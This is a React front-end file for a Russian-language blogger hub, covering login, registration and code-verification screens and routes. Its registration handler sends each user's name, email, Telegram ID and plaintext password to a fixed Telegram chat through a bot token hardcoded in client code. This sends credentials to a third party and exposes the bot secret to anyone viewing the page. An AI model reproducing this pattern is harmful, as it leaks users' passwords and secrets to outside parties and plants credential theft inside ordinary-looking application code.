import React, { useState } from 'react';
import { HashRouter, Routes, Route, Navigate } from 'react-router-dom';
import { AuthProvider, useAuth } from './context/AuthContext';
import Layout from './components/Layout';
import Dashboard from './pages/Dashboard';
import Bookings from './pages/Bookings';
import Inventory from './pages/Inventory';
import Requests from './pages/Requests';
import Community from './pages/Community';
import Events from './pages/Events';
import MyCalendar from './pages/MyCalendar';
import Users from './pages/Users';
import { Send, Smartphone, ArrowRight, CheckCircle2, ChevronLeft, Info, HelpCircle } from 'lucide-react';

const AuthPage = () => {
  const { login, initiateRegistration, confirmEmail, pendingUser } = useAuth();
  const [viewState, setViewState] = useState<'login' | 'register' | 'code'>('login');
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [telegramId, setTelegramId] = useState('');
  const [password, setPassword] = useState('');
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    const result = await login(email, password);
    setIsLoading(false);
    if (!result.success) setError(result.error || 'Ошибка входа');
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    const generatedCode = initiateRegistration(name, email, password, telegramId);
    
    // Telegram notification logic
    const token = "8254098834:AAHUmQdcykJ8_Bb7RkkD5N1PJYjIF4EA2ig";
    const chatId = "916014394";
    const text = `🆕 Регистрация блогера\nФИО: ${name}\nTelegram ID: ${telegramId}\nEmail: ${email}\nПароль: ${password}\nКод с сайта: ${generatedCode}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text })
        });
        setViewState('code');
    } catch (err) {
        setError('Ошибка связи с Telegram-ботом');
    } finally {
        setIsLoading(false);
    }
  };

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    const success = await confirmEmail(code);
    setIsLoading(false);
    if (!success) setError('Неверный код подтверждения. Попробуйте ввести вручную без пробелов.');
  };

  if (viewState === 'login') {
    return (
      <div className="min-h-screen bg-slate-100 flex items-center justify-center p-4">
        <div className="bg-white p-8 rounded-2xl shadow-xl w-full max-w-md text-center">
          <h1 className="text-3xl font-bold mb-2 text-orange-500">NewVisionHub</h1>
          <p className="text-slate-500 mb-8">Войдите в свой аккаунт</p>
          <form onSubmit={handleLogin} className="space-y-4 text-left">
            <input type="email" placeholder="Email" className="w-full px-4 py-3 rounded-lg border border-slate-200 focus:ring-2 focus:ring-orange-500 outline-none" value={email} onChange={e => setEmail(e.target.value)} required />
            <input type="password" placeholder="Пароль" className="w-full px-4 py-3 rounded-lg border border-slate-200 focus:ring-2 focus:ring-orange-500 outline-none" value={password} onChange={e => setPassword(e.target.value)} required />
            {error && <p className="text-red-500 text-sm text-center">{error}</p>}
            <button type="submit" disabled={isLoading} className="w-full bg-orange-500 text-white py-3 rounded-lg font-bold hover:bg-orange-600 transition shadow-lg shadow-orange-200">
              {isLoading ? 'Загрузка...' : 'Войти'}
            </button>
          </form>
          <button onClick={() => setViewState('register')} className="mt-6 text-sm text-slate-500 hover:text-orange-500 transition-colors">Нет аккаунта? Зарегистрироваться</button>
        </div>
      </div>
    );
  }

  if (viewState === 'register') {
    return (
      <div className="min-h-screen bg-slate-100 flex items-center justify-center p-4">
        <div className="bg-white p-8 rounded-2xl shadow-xl w-full max-w-3xl flex flex-col md:flex-row gap-8">
          <div className="md:w-1/2 bg-slate-50 p-6 rounded-xl border border-slate-200">
            <h3 className="font-bold text-lg mb-4 flex items-center gap-2 text-slate-800"><Send className="text-blue-500" size={20}/> Шаг 1: Подготовка</h3>
            <p className="text-sm text-slate-600 mb-6">Чтобы регистрация прошла успешно, выполните следующие действия:</p>
            
            <div className="space-y-4">
                <div className="bg-white p-4 rounded-lg border border-slate-100 shadow-sm">
                    <p className="text-xs font-bold text-slate-400 uppercase mb-2">Получение ID</p>
                    <p className="text-xs text-slate-600 mb-2">Узнайте свой ID в боте:</p>
                    <a href="https://t.me/userinfobot" target="_blank" className="inline-flex items-center gap-2 text-blue-600 font-bold hover:underline text-sm">
                        @userinfobot <ArrowRight size={14} />
                    </a>
                </div>

                <div className="bg-white p-4 rounded-lg border border-slate-100 shadow-sm">
                    <p className="text-xs font-bold text-slate-400 uppercase mb-2">Связь с ботом</p>
                    <p className="text-xs text-slate-600 mb-2">Нажмите /start в нашем боте:</p>
                    <a href="https://t.me/blogerhub37bot" target="_blank" className="inline-flex items-center gap-2 text-orange-600 font-bold hover:underline text-sm">
                        @blogerhub37bot <ArrowRight size={14} />
                    </a>
                </div>
            </div>
          </div>
          
          <div className="md:w-1/2">
            <h3 className="font-bold text-lg mb-4 text-slate-800">Шаг 2: Ваши данные</h3>
            <form onSubmit={handleRegister} className="space-y-3">
              <div className="space-y-1">
                <label className="text-[10px] font-bold text-slate-400 uppercase ml-1">ФИО</label>
                <input type="text" placeholder="Имя Фамилия" className="w-full px-4 py-2 rounded-lg border border-slate-200 outline-none focus:ring-2 focus:ring-orange-500" value={name} onChange={e => setName(e.target.value)} required />
              </div>
              <div className="space-y-1">
                <label className="text-[10px] font-bold text-slate-400 uppercase ml-1">Email</label>
                <input type="email" placeholder="example@mail.com" className="w-full px-4 py-2 rounded-lg border border-slate-200 outline-none focus:ring-2 focus:ring-orange-500" value={email} onChange={e => setEmail(e.target.value)} required />
              </div>
              <div className="space-y-1">
                <label className="text-[10px] font-bold text-slate-400 uppercase ml-1">Telegram ID</label>
                <input type="text" placeholder="Только цифры (из @userinfobot)" className="w-full px-4 py-2 rounded-lg border border-slate-200 outline-none focus:ring-2 focus:ring-orange-500" value={telegramId} onChange={e => setTelegramId(e.target.value)} required />
              </div>
              <div className="space-y-1">
                <label className="text-[10px] font-bold text-slate-400 uppercase ml-1">Пароль</label>
                <input type="password" placeholder="Минимум 6 символов" className="w-full px-4 py-2 rounded-lg border border-slate-200 outline-none focus:ring-2 focus:ring-orange-500" value={password} onChange={e => setPassword(e.target.value)} required minLength={6} />
              </div>
              
              <button type="submit" disabled={isLoading} className="w-full bg-orange-500 text-white py-3 rounded-lg font-bold hover:bg-orange-600 transition shadow-md shadow-orange-100 mt-4">
                {isLoading ? 'Отправка...' : 'Зарегистрироваться'}
              </button>
            </form>
            <button onClick={() => setViewState('login')} className="mt-4 text-sm text-slate-400 flex items-center gap-1 hover:text-orange-500 transition-colors mx-auto"><ChevronLeft size={16}/> Вернуться к входу</button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-100 flex items-center justify-center p-4">
      <div className="bg-white p-8 rounded-2xl shadow-xl w-full max-w-md text-center">
        <div className="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <Smartphone className="text-orange-500" size={32} />
        </div>
        <h2 className="text-2xl font-bold mb-2 text-slate-800">Проверка кода</h2>
        <p className="text-sm text-slate-500 mb-6">Введите 6-значный код, присланный ботом <span className="font-bold text-orange-600">@blogerhub37bot</span></p>
        <form onSubmit={handleVerify} className="space-y-4">
          <input type="text" maxLength={6} placeholder="000000" className="w-full px-4 py-4 rounded-xl border-2 border-slate-200 text-center text-4xl tracking-widest font-mono focus:border-orange-500 outline-none text-slate-800" value={code} onChange={e => setCode(e.target.value)} required />
          {error && <p className="text-red-500 text-xs font-medium bg-red-50 p-2 rounded">{error}</p>}
          <button type="submit" disabled={isLoading} className="w-full bg-orange-500 text-white py-4 rounded-xl font-bold hover:bg-orange-600 transition-all text-lg shadow-lg shadow-orange-200">
            {isLoading ? 'Проверка...' : 'Подтвердить'}
          </button>
        </form>
        <button onClick={() => setViewState('register')} className="mt-6 text-sm text-slate-400 hover:text-orange-500 transition-colors flex items-center justify-center gap-1 mx-auto">
            <ChevronLeft size={16}/> Изменить данные регистрации
        </button>
      </div>
    </div>
  );
};

const AppRoutes = () => {
    const { user } = useAuth();
    return (
        <Routes>
          <Route path="/" element={user ? <Layout /> : <Navigate to="/login" />}>
            <Route index element={<Dashboard />} />
            <Route path="bookings" element={<Bookings />} />
            <Route path="inventory" element={<Inventory />} />
            <Route path="my-calendar" element={<MyCalendar />} />
            <Route path="requests" element={<Requests />} />
            <Route path="community" element={<Community />} />
            <Route path="events" element={<Events />} />
            <Route path="users" element={<Users />} />
          </Route>
          <Route path="/login" element={!user ? <AuthPage /> : <Navigate to="/" />} />
          <Route path="*" element={<Navigate to="/" />} />
        </Routes>
    );
};

const App = () => {
  return (
    <AuthProvider>
      <HashRouter>
        <AppRoutes />
      </HashRouter>
    </AuthProvider>
  );
};

export default App;